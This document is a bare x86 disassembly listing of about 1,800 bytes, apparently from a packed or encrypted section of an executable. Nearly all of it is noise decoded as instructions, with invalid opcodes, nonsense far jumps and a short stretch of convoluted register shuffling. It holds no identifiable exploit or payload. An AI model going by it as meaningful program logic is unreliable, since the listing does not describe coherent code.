  40ce09:	aam    0x9f
  40ce0b:	adc    DWORD PTR [ebx],edx
  40ce0d:	dec    ebp
  40ce0e:	adc    BYTE PTR [edx-0x6e],ch
  40ce11:	loopne 0x40cdc1
  40ce13:	xlat   BYTE PTR ds:[ebx]
  40ce14:	xchg   ebp,eax
  40ce15:	pop    ecx
  40ce16:	icebp  
  40ce17:	out    dx,eax
  40ce18:	add    eax,DWORD PTR [ebp+ecx*4-0x67832075]
  40ce1f:	pop    eax
  40ce20:	jle    0x40ce0a
  40ce22:	jmp    0x40ce6c
  40ce24:	(bad)  
  40ce25:	cmp    eax,0x1eb37ce0
  40ce2a:	cmp    BYTE PTR [ebp+0x504be33f],cl
  40ce30:	push   cs
  40ce31:	mov    ds:0x4d806f85,al
  40ce36:	inc    ebp
  40ce37:	call   0xb1731655
  40ce3c:	or     DWORD PTR [edx+0x5b8526ff],ecx
  40ce42:	jl     0x40cdff
  40ce44:	jmp    0x40cddc
  40ce46:	(bad)  
  40ce47:	fistp  QWORD PTR [ebp+0x6ba1c8bf]
  40ce4d:	jge    0x40ce42
  40ce4f:	inc    edi
  40ce50:	scas   eax,DWORD PTR es:[edi]
  40ce51:	std    
  40ce52:	sbb    al,0xf3
  40ce54:	push   esi
  40ce55:	adc    edx,edi
  40ce57:	test   al,0x4d
  40ce59:	jne    0x40cde6
  40ce5b:	push   ecx
  40ce5c:	mov    bl,0xb5
  40ce5e:	mov    esp,0x80006fc2
  40ce63:	lods   eax,DWORD PTR ds:[esi]
  40ce64:	xor    BYTE PTR [edi+0x25089a4c],cl
  40ce6a:	test   DWORD PTR [esi],eax
  40ce6c:	imul   BYTE PTR [eax]
  40ce6e:	inc    ebp
  40ce6f:	mov    ebp,eax
  40ce71:	dec    ecx
  40ce72:	icebp  
  40ce73:	pop    eax
  40ce74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce75:	mov    bl,0x56
  40ce77:	in     eax,0x3b
  40ce79:	das    
  40ce7a:	cmp    BYTE PTR [edi+0x100d87f9],bl
  40ce80:	ret    
  40ce81:	aas    
  40ce82:	cmp    DWORD PTR [ebx+0x7d0eca36],ecx
  40ce88:	fdiv   DWORD PTR [eax-0x2b58edd4]
  40ce8e:	add    DWORD PTR [esi+0x7cdbb90e],0x25
  40ce95:	call   0xc919:0x48e98ee7
  40ce9c:	retf   
  40ce9d:	sub    DWORD PTR [ecx-0x3cab74b5],ebp
  40cea3:	dec    esp
  40cea4:	sbb    edi,edx
  40cea6:	sub    eax,0xd37d6a1a
  40ceab:	mov    bl,0xb8
  40cead:	dec    ebx
  40ceae:	mov    DWORD PTR [eax+0x7f],ebx
  40ceb1:	inc    eax
  40ceb2:	fstp   QWORD PTR [edi+0x67509bb0]
  40ceb8:	mov    ah,0x3a
  40ceba:	adc    BYTE PTR ds:0x9a55beed,0x73
  40cec1:	cli    
  40cec2:	arpl   di,sp
  40cec4:	or     eax,0x992b250
  40cec9:	pop    ebx
  40ceca:	inc    esi
  40cecb:	cmc    
  40cecc:	adc    eax,0x8a3da357
  40ced1:	inc    edx
  40ced2:	cs dec edx
  40ced4:	pop    edx
  40ced5:	xor    eax,0x3162a9f8
  40ceda:	mov    dl,0xf9
  40cedc:	repz jecxz 0x40cedf
  40cedf:	fcomp  QWORD PTR [ecx-0x6d62d306]
  40cee5:	mov    ah,0xd3
  40cee7:	ret    
  40cee8:	xchg   ecx,eax
  40cee9:	mov    bh,0xa4
  40ceeb:	mov    ds,WORD PTR [ebx+0x28]
  40ceee:	in     al,0x90
  40cef0:	push   eax
  40cef1:	out    0xb3,eax
  40cef3:	pusha  
  40cef4:	mov    ds:0xbb40b477,al
  40cef9:	push   esp
  40cefa:	jle    0x40cf67
  40cefc:	loope  0x40cf33
  40cefe:	test   ecx,esi
  40cf00:	ror    cl,cl
  40cf02:	in     al,dx
  40cf03:	add    DWORD PTR [edx],eax
  40cf05:	jmp    0xdb64:0xfeb0b7ec
  40cf0c:	push   ds
  40cf0d:	inc    eax
  40cf0e:	jg     0x40cee8
  40cf10:	daa    
  40cf11:	cwde   
  40cf12:	xor    eax,0x4f9c332c
  40cf17:	(bad)  
  40cf18:	and    al,0xbe
  40cf1a:	test   al,0x7f
  40cf1c:	pushf  
  40cf1d:	imul   ebx,DWORD PTR [esi],0xfffffff4
  40cf20:	gs loop 0x40cf09
  40cf23:	aam    0x94
  40cf25:	fnsave [ebx-0x25]
  40cf28:	mov    al,0x14
  40cf2a:	enter  0x14be,0x67
  40cf2e:	xrelease mov BYTE PTR [eax],bl
  40cf31:	repz clc 
  40cf33:	pop    esp
  40cf34:	sbb    cl,bl
  40cf36:	xchg   DWORD PTR [ebx],edi
  40cf38:	gs shufps xmm2,xmm2,0x5f
  40cf3d:	aaa    
  40cf3e:	fdivrp st(6),st
  40cf40:	adc    eax,0xbfaeaf90
  40cf45:	lock adc bh,BYTE PTR [ebx+0x4ae84412]
  40cf4c:	jp     0x40cf5f
  40cf4e:	xchg   ebx,eax
  40cf4f:	pop    es
  40cf50:	and    edi,DWORD PTR [esi+0x7f]
  40cf53:	mov    ch,0x43
  40cf55:	pop    edx
  40cf56:	lods   al,BYTE PTR ds:[esi]
  40cf57:	sbb    DWORD PTR [esi-0x41],ecx
  40cf5a:	sbb    al,dh
  40cf5c:	push   ecx
  40cf5d:	sbb    al,0x9b
  40cf5f:	sar    BYTE PTR [edx],1
  40cf61:	inc    eax
  40cf62:	add    BYTE PTR [ecx],al
  40cf64:	rcr    DWORD PTR [esi+0x1b629a24],0xb4
  40cf6b:	jl     0x40cf41
  40cf6d:	adc    eax,0xe5b25ea
  40cf72:	mov    BYTE PTR [eax-0x22],ah
  40cf75:	jmp    0xb019:0x12a50a0d
  40cf7c:	loopne 0x40cfed
  40cf7e:	push   esi
  40cf7f:	inc    ebp
  40cf80:	(bad)  
  40cf81:	aad    0x3b
  40cf83:	js     0x40cf6e
  40cf85:	push   cs
  40cf86:	and    bh,bl
  40cf88:	and    BYTE PTR [ebx+0x20],0x26
  40cf8c:	push   edi
  40cf8d:	dec    esi
  40cf8e:	hlt    
  40cf8f:	inc    edx
  40cf90:	sbb    bh,ch
  40cf92:	mov    edi,0xefa866cc
  40cf97:	mov    ecx,DWORD PTR [edx+0x3e]
  40cf9a:	fbld   TBYTE PTR cs:[edi-0x5504d7c1]
  40cfa1:	lock stc 
  40cfa3:	jnp    0x40d00a
  40cfa5:	gs xor al,bh
  40cfa8:	sbb    dh,BYTE PTR [edi+0x60]
  40cfab:	(bad)  
  40cfad:	sbb    cl,BYTE PTR [ecx+0x61]
  40cfb0:	sub    DWORD PTR [ecx],ebp
  40cfb2:	je     0x40cfb8
  40cfb4:	jmp    0x50b69108
  40cfb9:	shr    DWORD PTR [ebx-0x43370c2b],cl
  40cfbf:	test   BYTE PTR [edx+ecx*4-0x30],ch
  40cfc3:	adc    ebx,esi
  40cfc5:	stc    
  40cfc6:	aam    0x75
  40cfc8:	pop    eax
  40cfc9:	and    al,0xa6
  40cfcb:	jmp    0x40d028
  40cfcd:	mov    ebp,0x943a65c2
  40cfd2:	std    
  40cfd3:	sahf   
  40cfd4:	call   0x611d:0xebd4fa58
  40cfdb:	ret    
  40cfdc:	jo     0x40cfbe
  40cfde:	mul    bl
  40cfe0:	scas   eax,DWORD PTR es:[edi]
  40cfe1:	xor    edx,DWORD PTR [edx+0x0]
  40cfe4:	lock aam 0xfd
  40cfe7:	dec    ecx
  40cfe8:	push   ebp
  40cfe9:	push   0xb974342
  40cfee:	adc    cl,cl
  40cff0:	shr    esi,cl
  40cff2:	stos   DWORD PTR es:[edi],eax
  40cff3:	inc    ecx
  40cff4:	(bad)  
  40cff5:	ret    
  40cff6:	cwde   
  40cff7:	cmp    al,BYTE PTR [ebp-0x7b62af9]
  40cffd:	add    edi,ebx
  40cfff:	pusha  
  40d000:	aam    0x67
  40d002:	in     al,0xb0
  40d004:	fadd   QWORD PTR [edx-0x58]
  40d007:	push   esi
  40d008:	jne    0x40cfc2
  40d00a:	sbb    eax,esp
  40d00c:	push   0xffffffaf
  40d00e:	inc    esi
  40d00f:	leave  
  40d010:	(bad)  
  40d011:	xor    eax,0x97484bf0
  40d016:	and    esp,esp
  40d018:	add    ebx,ebx
  40d01a:	adc    bl,BYTE PTR [edi]
  40d01c:	scas   eax,DWORD PTR es:[edi]
  40d01d:	jmp    0x40cfd4
  40d01f:	or     bl,BYTE PTR [edx-0x2]
  40d022:	cmp    bh,BYTE PTR [eax-0x45]
  40d025:	leave  
  40d026:	mov    ebx,0x80ba353b
  40d02b:	test   eax,0x44139795
  40d031:	jb     0x40d038
  40d033:	das    
  40d034:	push   esp
  40d035:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d036:	sub    edx,esp
  40d038:	sbb    eax,0x300f364e
  40d03d:	cmp    DWORD PTR [edi-0x4c],esp
  40d040:	sub    ecx,edx
  40d042:	ss xor eax,0x7e451846
  40d048:	outs   dx,DWORD PTR ds:[esi]
  40d049:	pusha  
  40d04a:	ins    BYTE PTR es:[edi],dx
  40d04b:	rcl    BYTE PTR [edi-0x7807b226],cl
  40d051:	hlt    
  40d052:	popa   
  40d053:	int    0x95
  40d055:	mov    es,esi
  40d057:	(bad)  
  40d058:	mov    bh,0xcf
  40d05a:	mov    ds:0x24b3265d,eax
  40d05f:	ss push ecx
  40d061:	mov    DWORD PTR [esi-0x6770dd6],ebx
  40d067:	push   edx
  40d068:	jae    0x40d024
  40d06a:	test   DWORD PTR [eax-0x68],esp
  40d06d:	out    dx,al
  40d06e:	mov    eax,ds:0x65370557
  40d073:	test   eax,0xbb13b1da
  40d078:	scas   al,BYTE PTR es:[edi]
  40d079:	push   eax
  40d07a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d07b:	test   BYTE PTR [ebx+0x51],bh
  40d07e:	aam    0xc4
  40d080:	dec    esp
  40d081:	out    dx,eax
  40d082:	push   eax
  40d083:	or     eax,0x65cef4e8
  40d088:	iret   
  40d089:	mov    bh,0xbe
  40d08b:	sbb    eax,0xab2aef4d
  40d090:	pop    ds
  40d091:	mov    bl,0x9f
  40d093:	test   ebx,ecx
  40d095:	fld    TBYTE PTR [edx+0x1bea99a2]
  40d09b:	mov    ah,BYTE PTR [esi+edi*2]
  40d09e:	rcr    eax,0xca
  40d0a1:	push   ebp
  40d0a2:	sbb    BYTE PTR [edi-0x110dbe6b],cl
  40d0a8:	inc    eax
  40d0a9:	xchg   bh,al
  40d0ab:	add    eax,0xc43135d5
  40d0b0:	outs   dx,BYTE PTR ds:[esi]
  40d0b1:	pusha  
  40d0b2:	pop    esi
  40d0b3:	xlat   BYTE PTR ds:[ebx]
  40d0b4:	and    BYTE PTR [edi],0x9a
  40d0b7:	mov    al,ds:0x5f458b3b
  40d0bc:	adc    esi,DWORD PTR [eax]
  40d0be:	test   BYTE PTR [eax],0x6b
  40d0c1:	or     ecx,DWORD PTR [eax-0x622e2af8]
  40d0c7:	neg    BYTE PTR [ecx-0x12]
  40d0ca:	fnsave [eax-0x4c]
  40d0cd:	jmp    0x40d055
  40d0cf:	mov    al,0xa4
  40d0d1:	dec    edx
  40d0d2:	pushf  
  40d0d3:	rcl    BYTE PTR [ebx-0x110cff12],0x55
  40d0da:	xchg   ebp,eax
  40d0db:	cdq    
  40d0dc:	sbb    al,0xa5
  40d0de:	adc    eax,edi
  40d0e0:	repnz loopne 0x40d14a
  40d0e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0e4:	mov    bl,0xc4
  40d0e6:	xchg   ecx,eax
  40d0e7:	(bad)  
  40d0e8:	cld    
  40d0e9:	pop    esi
  40d0ea:	sbb    ch,dh
  40d0ec:	add    BYTE PTR [ebx-0x1daf9761],0x92
  40d0f3:	pop    ebp
  40d0f4:	or     eax,0xc55e9b6a
  40d0f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0fa:	push   esp
  40d0fb:	fnstenv [eax]
  40d0fd:	lods   al,BYTE PTR ds:[esi]
  40d0fe:	push   esp
  40d0ff:	mov    bh,0x5d
  40d101:	inc    esi
  40d102:	in     al,dx
  40d103:	xchg   ecx,eax
  40d104:	inc    eax
  40d105:	jne    0x40d0f3
  40d107:	adc    ebp,esi
  40d109:	scas   al,BYTE PTR es:[edi]
  40d10a:	and    eax,0xf860f08b
  40d10f:	sbb    al,0x97
  40d111:	je     0x40d0e9
  40d113:	adc    DWORD PTR [esi-0xb],0x63
  40d117:	jle    0x40d0e1
  40d119:	xchg   esi,eax
  40d11a:	jae    0x40d11a
  40d11c:	dec    ebp
  40d11d:	inc    eax
  40d11e:	adc    edi,0x3d
  40d121:	dec    esp
  40d122:	or     bh,bl
  40d124:	loop   0x40d0cd
  40d126:	(bad)  
  40d127:	push   ds
  40d128:	test   BYTE PTR ds:0x4fbd0a2c,al
  40d12e:	(bad)  
  40d12f:	lods   al,BYTE PTR ds:[esi]
  40d130:	loop   0x40d0f8
  40d132:	sahf   
  40d133:	int3   
  40d134:	jbe    0x40d109
  40d136:	jmp    0x711c:0xbb1679a5
  40d13d:	in     eax,0x85
  40d13f:	ss cmc 
  40d141:	mov    ebp,0x127116fa
  40d146:	mov    ds:0x7699b4c8,eax
  40d14b:	pop    esi
  40d14c:	scas   eax,DWORD PTR es:[edi]
  40d14d:	cdq    
  40d14e:	ins    BYTE PTR es:[edi],dx
  40d14f:	push   ds
  40d150:	sub    bl,dl
  40d152:	or     al,0x1c
  40d154:	addr16 daa 
  40d156:	(bad)  
  40d157:	int    0x26
  40d159:	jns    0x40d18a
  40d15b:	cmp    ah,BYTE PTR [esi+ebp*8]
  40d15e:	je     0x40d166
  40d160:	pop    ebx
  40d161:	dec    esp
  40d162:	not    BYTE PTR [eax+0x28]
  40d165:	jmp    0x97769df9
  40d16a:	or     DWORD PTR [edi-0x67],edi
  40d16d:	dec    ebx
  40d16e:	inc    ebp
  40d16f:	stos   DWORD PTR es:[edi],eax
  40d170:	rcl    BYTE PTR [edx],cl
  40d172:	ret    0x10ab
  40d175:	xchg   esp,eax
  40d176:	jg     0x40d142
  40d178:	sub    al,0x5b
  40d17a:	pusha  
  40d17b:	lds    ebx,FWORD PTR [ebx]
  40d17d:	cmp    ecx,DWORD PTR [ebp-0x69]
  40d180:	shl    edi,1
  40d182:	scas   al,BYTE PTR es:[edi]
  40d183:	or     al,0x12
  40d185:	jl     0x40d173
  40d187:	mov    ah,ah
  40d189:	sti    
  40d18a:	popa   
  40d18b:	inc    esi
  40d18c:	shl    DWORD PTR [eax],cl
  40d18e:	dec    esp
  40d18f:	mov    eax,0x364b6d82
  40d194:	fld1   
  40d196:	jecxz  0x40d1a1
  40d198:	dec    ecx
  40d199:	sub    al,0x24
  40d19b:	aaa    
  40d19c:	mov    al,ds:0x33f535ec
  40d1a1:	cmp    dh,BYTE PTR [ebx+0x69]
  40d1a4:	inc    esi
  40d1a5:	sub    dl,dh
  40d1a7:	out    dx,eax
  40d1a8:	adc    cl,BYTE PTR [eax+0x34f2413c]
  40d1ae:	mov    DWORD PTR [edi],ecx
  40d1b0:	and    edx,DWORD PTR [ebp+0x6b917446]
  40d1b6:	pop    esi
  40d1b7:	or     al,0x45
  40d1b9:	sub    al,0x49
  40d1bb:	cmp    BYTE PTR [esi+esi*1+0x1b3188f5],al
  40d1c2:	sbb    dh,ch
  40d1c4:	loopne 0x40d243
  40d1c6:	ss ja  0x40d1c4
  40d1c9:	mov    cl,0xd7
  40d1cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1cc:	sar    BYTE PTR [eax+eax*1+0x3b],1
  40d1d0:	adc    al,0x65
  40d1d2:	lahf   
  40d1d3:	out    0x36,eax
  40d1d5:	pushf  
  40d1d6:	and    ah,ah
  40d1d8:	nop
  40d1d9:	sub    al,0xcf
  40d1db:	sbb    esi,DWORD PTR [eax]
  40d1dd:	lods   eax,DWORD PTR ds:[esi]
  40d1de:	push   0xee24ead4
  40d1e3:	pop    edx
  40d1e4:	cwde   
  40d1e5:	mul    BYTE PTR [ecx+eax*8+0x26e364ef]
  40d1ec:	into   
  40d1ed:	push   ecx
  40d1ee:	sub    BYTE PTR [edx-0x1f9e73a0],bl
  40d1f4:	xchg   edi,eax
  40d1f5:	inc    edi
  40d1f6:	cmp    eax,0x9309d438
  40d1fb:	retf   
  40d1fc:	hlt    
  40d1fd:	jmp    0x2eb0:0xc0ab6f20
  40d204:	neg    BYTE PTR [esi+0x48]
  40d207:	push   ss
  40d208:	or     cl,BYTE PTR [eax+0x5a9ac06f]
  40d20e:	fcmovu st,st(6)
  40d210:	sub    bl,BYTE PTR [eax-0x17b6a7e3]
  40d216:	ss pop ebp
  40d218:	and    BYTE PTR [ebx+0x5f],bh
  40d21b:	test   al,0x9b
  40d21d:	popa   
  40d21e:	stc    
  40d21f:	outs   dx,DWORD PTR ds:[esi]
  40d220:	jo     0x40d243
  40d222:	iret   
  40d223:	mov    edi,0x4d52e228
  40d228:	(bad)  
  40d229:	mov    dl,0x19
  40d22b:	call   DWORD PTR [edx+ebp*1+0x22]
  40d22f:	fadd   st,st(4)
  40d231:	fwait
  40d232:	out    dx,eax
  40d233:	or     al,0x7f
  40d236:	mov    ebp,0xf88f18dc
  40d23b:	inc    esp
  40d23c:	mov    ecx,0x3faeea62
  40d241:	rcl    DWORD PTR [ecx+ecx*1],cl
  40d244:	js     0x40d250
  40d246:	call   DWORD PTR [ecx]
  40d248:	push   cs
  40d249:	int    0x4f
  40d24b:	stc    
  40d24c:	rcl    BYTE PTR [edi],cl
  40d24e:	popa   
  40d24f:	sar    BYTE PTR [ebp+0x7702acda],0x61
  40d256:	push   ss
  40d257:	inc    esp
  40d258:	pop    ecx
  40d259:	push   eax
  40d25a:	out    dx,al
  40d25b:	aas    
  40d25c:	mov    DWORD PTR [edi],ebp
  40d25e:	push   ecx
  40d25f:	(bad)  
  40d260:	(bad)  
  40d261:	(bad)  
  40d262:	repz clc 
  40d264:	cdq    
  40d265:	jl     0x40d275
  40d267:	icebp  
  40d268:	out    dx,eax
  40d269:	popf   
  40d26a:	enter  0x1234,0x86
  40d26e:	fld    TBYTE PTR [edi+0x42e08342]
  40d274:	xor    DWORD PTR [esi+0x4effd680],edx
  40d27a:	jp     0x40d28e
  40d27c:	add    eax,0x7f245639
  40d281:	dec    eax
  40d282:	sbb    esp,DWORD PTR [eax]
  40d284:	pop    edi
  40d285:	into   
  40d286:	ins    DWORD PTR es:[edi],dx
  40d287:	adc    edx,esi
  40d289:	sbb    bl,BYTE PTR [edi-0x1c35f0a9]
  40d28f:	xchg   esp,eax
  40d290:	fs inc ebx
  40d292:	and    DWORD PTR [edx],ebp
  40d294:	push   ds
  40d295:	sub    eax,0xd3338576
  40d29a:	fldcw  WORD PTR [edi+ecx*1-0x57337219]
  40d2a1:	imul   BYTE PTR [edi]
  40d2a3:	or     ecx,DWORD PTR [esi]
  40d2a5:	fist   WORD PTR [eax+ebx*2]
  40d2a8:	jg     0x40d306
  40d2aa:	fsubrp st(2),st
  40d2ac:	out    0xa4,eax
  40d2ae:	fisttp WORD PTR [eax]
  40d2b0:	cmc    
  40d2b1:	popf   
  40d2b2:	mov    eax,0x45288c95
  40d2b7:	jnp    0x40d31a
  40d2b9:	aaa    
  40d2ba:	add    dh,0xf2
  40d2bd:	ds out dx,al
  40d2bf:	lods   al,BYTE PTR ds:[esi]
  40d2c0:	(bad)  
  40d2c1:	jbe    0x40d297
  40d2c3:	cmp    esp,DWORD PTR [edx]
  40d2c5:	into   
  40d2c6:	dec    esp
  40d2c7:	sbb    BYTE PTR [ecx],ch
  40d2c9:	adc    BYTE PTR [ebp+0x86eb4c1],0x96
  40d2d0:	ret    0xd633
  40d2d3:	inc    edi
  40d2d4:	aaa    
  40d2d5:	cmp    ah,BYTE PTR [eax-0x72]
  40d2d8:	in     eax,0x1a
  40d2da:	xor    al,0xdc
  40d2dc:	test   BYTE PTR [edi+esi*8-0xb733988],al
  40d2e3:	push   DWORD PTR [ecx-0x72]
  40d2e6:	jo     0x40d2e6
  40d2e8:	jmp    0xdfc46b6f
  40d2ed:	cmp    dh,BYTE PTR [ecx-0x9]
  40d2f0:	pop    esp
  40d2f1:	sbb    al,0xff
  40d2f3:	pusha  
  40d2f4:	or     bh,cl
  40d2f6:	jns    0x40d294
  40d2f8:	ret    
  40d2f9:	dec    esi
  40d2fa:	fdiv   DWORD PTR [ebx+0x6ce64604]
  40d300:	mov    ebx,0x75c8e4c0
  40d305:	sar    DWORD PTR [ecx-0x1b],0x42
  40d309:	jno    0x40d34c
  40d30b:	das    
  40d30c:	js     0x40d2ee
  40d30e:	mov    dh,dl
  40d310:	aad    0xfb
  40d312:	and    ebx,DWORD PTR [eax]
  40d314:	loope  0x40d2ae
  40d316:	repz mov ah,0xa1
  40d319:	pop    ss
  40d31a:	mov    ecx,DWORD PTR [edx]
  40d31c:	data16 test BYTE PTR [edx-0x4d37e275],0x96
  40d324:	or     al,0x17
  40d326:	sar    BYTE PTR [edi+0x6e],1
  40d329:	retf   0xa8ec
  40d32c:	pop    es
  40d32d:	in     al,0xba
  40d32f:	and    eax,DWORD PTR [ecx]
  40d331:	(bad)  
  40d332:	cli    
  40d333:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d334:	pop    eax
  40d335:	cmp    DWORD PTR [esi-0x7c],0x275464b
  40d33c:	in     al,dx
  40d33d:	fwait
  40d33e:	or     edx,edx
  40d340:	cmp    eax,0x5303b12d
  40d345:	je     0x40d39a
  40d347:	add    edx,esi
  40d349:	bound  esi,QWORD PTR [eax-0x1d]
  40d34c:	push   edx
  40d34d:	jo     0x40d325
  40d34f:	loop   0x40d3bd
  40d351:	aad    0x3f
  40d353:	xchg   edi,eax
  40d354:	inc    ebp
  40d355:	or     DWORD PTR [edx],edx
  40d357:	in     eax,dx
  40d358:	les    esi,FWORD PTR ds:0xc6618c27
  40d35e:	cvtps2pi mm0,QWORD PTR [edx]
  40d361:	mov    ebx,0x5740b7b7
  40d366:	adc    eax,0x8a27cfac
  40d36b:	repnz fincstp 
  40d36e:	or     BYTE PTR [esp+eiz*2+0x6f0903bd],0xe8
  40d376:	xor    dh,BYTE PTR [edx+0x79]
  40d379:	push   ebp
  40d37a:	das    
  40d37b:	dec    edx
  40d37c:	inc    esp
  40d37d:	lds    eax,FWORD PTR [ecx+0x1002c3]
  40d383:	add    BYTE PTR [ebp-0x2ffc17bb],cl
  40d389:	add    edx,0x5
  40d38c:	push   edx
  40d38d:	inc    esi
  40d38e:	pop    ecx
  40d38f:	dec    ecx
  40d390:	xchg   ecx,eax
  40d391:	dec    eax
  40d392:	xchg   ecx,eax
  40d393:	dec    ecx
  40d394:	xchg   ecx,edx
  40d396:	dec    edx
  40d397:	push   edx
  40d398:	mov    edx,ebx
  40d39a:	pop    ebx
  40d39b:	dec    ebx
  40d39c:	call   DWORD PTR [ebx]
  40d39e:	cmp    DWORD PTR [ebp+0x10],esi
  40d3a1:	je     0x40f754
  40d3a7:	xchg   edx,eax
  40d3a8:	push   0xc
  40d3aa:	pop    ecx
  40d3ab:	dec    ecx
  40d3ac:	push   0x3
  40d3ae:	pop    ebx
  40d3af:	inc    ebx
  40d3b0:	xchg   ebx,ecx
  40d3b2:	inc    ecx
  40d3b3:	sub    ebx,ecx
  40d3b5:	xchg   ebx,ecx
  40d3b7:	dec    ecx
  40d3b8:	dec    ecx
  40d3b9:	mov    eax,DWORD PTR [ebp-0x1c]
  40d3bc:	imul   eax,ecx
  40d3bf:	jmp    0x40f751
  40d3c4:	inc    eax
  40d3c5:	sbb    edx,DWORD PTR [ebp-0x1e]
  40d3c8:	push   edx
  40d3c9:	mov    ds:0x35198590,al
  40d3ce:	aad    0x91
  40d3d0:	stos   BYTE PTR es:[edi],al
  40d3d1:	and    DWORD PTR [ecx+esi*8-0x7c7c2c4e],ebp
  40d3d8:	or     al,0x5e
  40d3da:	add    DWORD PTR [ebx+0x3e8b9b87],0xa
  40d3e1:	mov    cl,0x25
  40d3e3:	or     esp,DWORD PTR [edi-0x47f49acf]
  40d3e9:	pop    es
  40d3ea:	jno    0x40d44e
  40d3ec:	(bad)  
  40d3ed:	lds    esi,FWORD PTR [eax-0x5547afb9]
  40d3f3:	push   edx
  40d3f4:	cmp    ch,BYTE PTR [ebx]
  40d3f6:	fs loopne 0x40d3b7
  40d3f9:	pop    edx
  40d3fa:	dec    ebp
  40d3fb:	imul   DWORD PTR gs:[ecx+0x32]
  40d3ff:	shl    ecx,1
  40d401:	ret    0x305a
  40d404:	enter  0x5b5c,0x83
  40d408:	repz push eax
  40d40a:	popa   
  40d40b:	or     dh,dl
  40d40d:	inc    ecx
  40d40e:	push   es
  40d40f:	loopne 0x40d3e4
  40d411:	xor    ebx,DWORD PTR [eax+0x45]
  40d414:	mov    eax,ds:0x22c37058
  40d419:	sbb    eax,0x5249b6cd
  40d41e:	bound  eax,QWORD PTR [edx-0x3b]
  40d421:	repnz lea eax,[eax]
  40d424:	test   BYTE PTR [ecx+0x1a],dl
  40d427:	mov    eax,ds:0xc46ea1cc
  40d42c:	pop    esi
  40d42d:	mov    dh,0x3c
  40d42f:	ds jmp 0x5f7:0x861463dd
  40d437:	push   ebp
  40d438:	dec    ecx
  40d439:	sti    
  40d43a:	mov    bl,dl
  40d43c:	mov    al,0xbd
  40d43e:	retf   0xefb4
  40d441:	mov    eax,0xe76f1748
  40d446:	inc    esp
  40d447:	xchg   edi,eax
  40d448:	xchg   BYTE PTR [eax],ah
  40d44a:	mov    eax,ds:0x208ef375
  40d44f:	inc    ecx
  40d450:	jb     0x40d4a1
  40d452:	dec    esp
  40d453:	popa   
  40d454:	pop    edx
  40d455:	mov    edx,0x38d25d8d
  40d45a:	nop
  40d45b:	retf   0x27e8
  40d45e:	inc    eax
  40d45f:	mov    edx,ebx
  40d461:	cmp    dh,ch
  40d463:	mov    ds:0xfadbe818,eax
  40d468:	ins    DWORD PTR es:[edi],dx
  40d469:	fmul   QWORD PTR [esi-0x59acd27d]
  40d46f:	mov    bl,0x5c
  40d471:	mov    dh,0x70
  40d473:	cmp    al,0x6f
  40d475:	mov    bh,0x5d
  40d477:	mov    eax,0x6476be26
  40d47c:	hlt    
  40d47d:	scas   al,BYTE PTR es:[edi]
  40d47e:	aas    
  40d47f:	addr16 call 0x3b62:0x32a1bd09
  40d487:	cs pop esi
  40d489:	mov    eax,0xc36ebd48
  40d48e:	popf   
  40d48f:	inc    esp
  40d490:	xor    ch,cl
  40d492:	mov    edx,0xe952da4e
  40d497:	cld    
  40d498:	pop    ebx
  40d499:	scas   eax,DWORD PTR es:[edi]
  40d49a:	imul   ebp,DWORD PTR [edx-0x40],0x5f7e11e9
  40d4a1:	rcr    DWORD PTR [ebx+0x64],1
  40d4a4:	inc    ebx
  40d4a5:	pop    ss
  40d4a6:	das    
  40d4a7:	pop    esp
  40d4a8:	dec    ebp
  40d4a9:	popf   
  40d4aa:	jecxz  0x40d4d7
  40d4ac:	pop    ebp
  40d4ad:	test   al,0xce
  40d4af:	dec    edx
  40d4b0:	ret    0x369e
  40d4b3:	xor    edi,ebp
  40d4b5:	outs   dx,DWORD PTR ds:[esi]
  40d4b6:	jp     0x40d4bb
  40d4b8:	pop    edx
  40d4b9:	pop    edi
  40d4ba:	rcr    BYTE PTR [esi-0x27e4d64f],cl
  40d4c0:	sbb    BYTE PTR [edi],bl
  40d4c2:	aam    0xd1
  40d4c4:	test   BYTE PTR [ebx+0x33],ah
  40d4c7:	inc    edi
  40d4c8:	pop    edi
  40d4c9:	pop    esp
  40d4ca:	xchg   dl,bh
  40d4cc:	sub    BYTE PTR [esi],0x93
  40d4cf:	sar    DWORD PTR [edx-0x3f],0x65
  40d4d3:	imul   esi,DWORD PTR [edi-0x4a],0x28
  40d4d7:	jle    0x40d476
  40d4d9:	push   ds
  40d4da:	mov    ebp,0x369d47b1
  40d4df:	sub    eax,0x79574edd
  40d4e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4e5:	sub    eax,0xffffffda
  40d4e8:	and    esp,DWORD PTR [edx+ebx*4-0x47]
  40d4ec:	sub    BYTE PTR [edi-0x58],al
  40d4ef:	(bad)  
  40d4f0:	fs out 0x72,al
  40d4f3:	stc    
  40d4f4:	cmp    BYTE PTR [ebp+0x63],dh
  40d4f7:	sub    DWORD PTR [eax-0x7a],ebx
  40d4fa:	sub    al,0x87
  40d4fc:	mov    esi,0xb2b9ecb1
  40d501:	out    0x5f,eax
  40d503:	aam    0x46
  40d505:	xor    DWORD PTR [edx],esi
  40d507:	mov    esi,0xb1ec180c
  40d50c:	xor    al,0x4c
  40d50e:	and    DWORD PTR [eax+0x44d8c2e0],ebp
  40d514:	sti    
  40d515:	mov    eax,0xa016813c
  40d51a:	jge    0x40d599
  40d51c:	setns  BYTE PTR [ebp+0x68]
  40d520:	and    edx,DWORD PTR [esi-0x3a26b514]
  40d526:	ss mov bl,0x92
  40d529:	stos   DWORD PTR es:[edi],eax
  40d52a:	outs   dx,DWORD PTR ds:[esi]
  40d52b:	xor    eax,0xbd6cf082
  40d530:	outs   dx,DWORD PTR ds:[esi]
  40d531:	lock jo 0x40d54b
  40d534:	sbb    BYTE PTR [ebx-0x12ab093],cl
  40d53a:	lods   al,BYTE PTR ds:[esi]
  40d53b:	pop    ecx
  40d53c:	sbb    bh,BYTE PTR [eax-0x2303bd65]
  40d542:	rcl    BYTE PTR [ebx+0x64a1173a],0x16
  40d549:	mov    bl,0xf5
  40d54b:	or     dh,BYTE PTR [edi+0x34]
  40d54e:	cmp    DWORD PTR [ebx+esi*2],0xffb01ba9
  40d555:	xor    DWORD PTR [esi],ebp
  40d557:	jb     0x40d4e9
